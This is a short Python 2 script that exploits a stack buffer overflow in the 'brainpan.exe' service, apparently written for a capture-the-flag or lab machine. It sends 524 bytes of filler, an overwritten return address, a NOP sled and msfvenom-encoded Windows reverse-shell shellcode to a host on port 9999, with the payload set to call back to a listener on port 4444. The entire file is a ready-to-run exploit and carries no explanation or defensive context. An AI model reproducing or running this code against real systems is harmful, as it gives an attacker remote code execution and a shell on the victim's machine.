#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "\x41" * 524
    eip = "\xf3\x12\x17\x31"    # from brainpan.exe
    nops = "\x90" * 8
    #msfvenom -p windows/shell_reverse_tcp LHOST=172.16.50.3 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00"
    shell = (
    "\xbe\xe1\xee\x13\x38\xd9\xeb\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
    "\x52\x83\xc0\x04\x31\x70\x0e\x03\x91\xe0\xf1\xcd\xad\x15\x77"
    "\x2d\x4d\xe6\x18\xa7\xa8\xd7\x18\xd3\xb9\x48\xa9\x97\xef\x64"
    "\x42\xf5\x1b\xfe\x26\xd2\x2c\xb7\x8d\x04\x03\x48\xbd\x75\x02"
    "\xca\xbc\xa9\xe4\xf3\x0e\xbc\xe5\x34\x72\x4d\xb7\xed\xf8\xe0"
    "\x27\x99\xb5\x38\xcc\xd1\x58\x39\x31\xa1\x5b\x68\xe4\xb9\x05"
    "\xaa\x07\x6d\x3e\xe3\x1f\x72\x7b\xbd\x94\x40\xf7\x3c\x7c\x99"
    "\xf8\x93\x41\x15\x0b\xed\x86\x92\xf4\x98\xfe\xe0\x89\x9a\xc5"
    "\x9b\x55\x2e\xdd\x3c\x1d\x88\x39\xbc\xf2\x4f\xca\xb2\xbf\x04"
    "\x94\xd6\x3e\xc8\xaf\xe3\xcb\xef\x7f\x62\x8f\xcb\x5b\x2e\x4b"
    "\x75\xfa\x8a\x3a\x8a\x1c\x75\xe2\x2e\x57\x98\xf7\x42\x3a\xf5"
    "\x34\x6f\xc4\x05\x53\xf8\xb7\x37\xfc\x52\x5f\x74\x75\x7d\x98"
    "\x7b\xac\x39\x36\x82\x4f\x3a\x1f\x41\x1b\x6a\x37\x60\x24\xe1"
    "\xc7\x8d\xf1\xa6\x97\x21\xaa\x06\x47\x82\x1a\xef\x8d\x0d\x44"
    "\x0f\xae\xc7\xed\xba\x55\x80\xbd\x2b\x67\x53\xd6\x49\x87\x42"
    "\x7a\xc7\x61\x0e\x92\x81\x3a\xa7\x0b\x88\xb0\x56\xd3\x06\xbd"
    "\x59\x5f\xa5\x42\x17\xa8\xc0\x50\xc0\x58\x9f\x0a\x47\x66\x35"
    "\x22\x0b\xf5\xd2\xb2\x42\xe6\x4c\xe5\x03\xd8\x84\x63\xbe\x43"
    "\x3f\x91\x43\x15\x78\x11\x98\xe6\x87\x98\x6d\x52\xac\x8a\xab"
    "\x5b\xe8\xfe\x63\x0a\xa6\xa8\xc5\xe4\x08\x02\x9c\x5b\xc3\xc2"
    "\x59\x90\xd4\x94\x65\xfd\xa2\x78\xd7\xa8\xf2\x87\xd8\x3c\xf3"
    "\xf0\x04\xdd\xfc\x2b\x8d\xed\xb6\x71\xa4\x65\x1f\xe0\xf4\xeb"
    "\xa0\xdf\x3b\x12\x23\xd5\xc3\xe1\x3b\x9c\xc6\xae\xfb\x4d\xbb"
    "\xbf\x69\x71\x68\xbf\xbb"
    )
    buffer = filler+eip+nops+shell
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("172.16.101.21",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

